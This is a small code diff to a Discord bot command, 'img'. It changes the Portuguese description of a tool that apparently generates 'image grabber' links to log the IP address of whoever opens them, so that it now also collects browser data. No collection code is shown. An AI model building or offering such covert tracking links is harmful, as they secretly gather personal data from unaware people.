@@ -3,7 +3,7 @@ const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, Butt
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('img')
-    .setDescription('📸 Gera um Image Grabber com IP Logger')
+    .setDescription('📸 Gera um Image Grabber com IP Logger + dados do navegador')
     .addStringOption(option =>
       option.setName('link')
         .setDescription('Link da imagem (opcional)')
